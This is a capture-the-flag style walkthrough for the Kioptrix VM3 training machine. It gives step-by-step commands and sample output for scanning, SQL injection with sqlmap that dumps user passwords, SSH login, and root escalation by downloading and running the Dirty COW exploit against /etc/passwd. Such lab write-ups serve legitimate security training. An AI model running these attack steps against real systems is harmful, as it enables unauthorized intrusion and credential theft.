# Kioptrix VM3 Walkthrough

## **Prerequisites**
Before starting, ensure the following:

1. **Kioptrix VM3**: Running on VMware or a similar hypervisor.
2. **Attacking Machine**: A penetration testing OS like Kali Linux.
3. **Knowledge**: Basic familiarity with Linux and penetration testing tools.

---

## **1. Network Configuration and Target Discovery**
Ensure both the Kioptrix VM3 and the attacking machine are on the same network. To discover the target's IP address, perform a network scan using `nmap`:

```bash
nmap 192.168.48.1/24
```

### **Sample Output:**
```plaintext
Nmap scan report for 192.168.48.149
Host is up (0.0031s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:FD:CB:95 (VMware)
```

The target IP address is **192.168.48.149**, with SSH (port 22) and HTTP (port 80) open.

---

## **2. Bind Target IP to a Domain Name**
To simplify referencing the target, bind its IP address to a domain name in your `/etc/hosts` file:

```bash
sudo nano /etc/hosts
```

Add the following line:
```plaintext
192.168.48.149 kioptrix3.com
```

Verify the changes:
```bash
cat /etc/hosts
```

### **Expected Output:**
```plaintext
127.0.0.1 localhost
192.168.48.149 kioptrix3.com
```

---

## **3. Service Enumeration**
Perform a detailed scan to identify running services and their versions:

```bash
nmap -sV 192.168.48.149
```

### **Sample Output:**
```plaintext
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
```

The target is running **Apache on port 80** and **OpenSSH on port 22**.

---

## **4. Enumerating HTTP Services**
Since port 80 is open, access the web application by navigating to:

```plaintext
http://kioptrix3.com/
```

To enumerate hidden directories, use **Gobuster** with a wordlist:

```bash
gobuster dir -u http://kioptrix3.com/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

### **Sample Output:**
```plaintext
/modules (Status: 301)
/gallery (Status: 301)
/data (Status: 403)
/core (Status: 301)
/style (Status: 301)
/phpmyadmin (Status: 301)
```

Directories such as `/gallery` and `/phpmyadmin` are potential targets for further investigation.

---

## **5. Scanning for Web Application Vulnerabilities**
Use **Nikto** to scan for vulnerabilities in the `/gallery` directory:

```bash
nikto -h http://kioptrix3.com/gallery
```

### **Sample Output:**
```plaintext
/gallery/: The X-Content-Type-Options header is not set.
PHP/5.2.4-2ubuntu5.6 appears to be outdated.
Apache/2.2.8 appears to be outdated.
...
/gallery/db.sql: DATABASE SQL FOUND!
```

The `/gallery/db.sql` file contains sensitive data.

---

## **6. SQL Injection Exploitation**
Exploit a SQL injection vulnerability in `/gallery/gallery.php` using **SQLmap**:

```bash
sqlmap --batch --banner -u http://kioptrix3.com/gallery/gallery.php?id=1 --dump
```

### **Sample Output:**
```plaintext
[INFO] fetched: 'dev_accounts' table entries

+----+---------------------------------------------+------------+
| id | password                                   | username   |
+----+---------------------------------------------+------------+
| 1  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |
| 2  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |
+----+---------------------------------------------+------------+
```

The credentials for `loneferret` are retrieved.

---

## **7. Accessing SSH with Cracked Credentials**
Log in using the retrieved username and password:

```bash
ssh loneferret@192.168.48.149
```

If the connection fails due to unsupported key algorithms, use:

```bash
ssh loneferret@192.168.48.149 -oHostKeyAlgorithms=+ssh-rsa
```

After logging in, explore the system for privilege escalation opportunities.

---

## **8. Privilege Escalation**
### Check Sudo Privileges
Run the following command:

```bash
sudo -l
```

### **Sample Output:**
```plaintext
User loneferret may run the following commands on this host:
(root) NOPASSWD: !/usr/bin/su
(root) NOPASSWD: /usr/local/bin/ht
```

Since `/usr/local/bin/ht` is executable with root privileges, leverage it to gain root access.

### Alternative: Exploit SUID Binaries
Search for SUID binaries or vulnerabilities like Dirty COW:

```bash
searchsploit linux/local/40839
```

Transfer and compile the exploit:

```bash
python3 -m http.server 8000
wget http://192.168.48.157:8000/40839.c
gcc -pthread 40839.c -o dirty -lcrypt
./dirty /etc/passwd
```

This exploit overwrites `/etc/passwd`, granting root access.

---

## **Note**
This walkthrough is for educational purposes only. Ensure you have explicit permission before testing any system. Use these tools responsibly in authorized environments such as CTF challenges or penetration testing engagements.

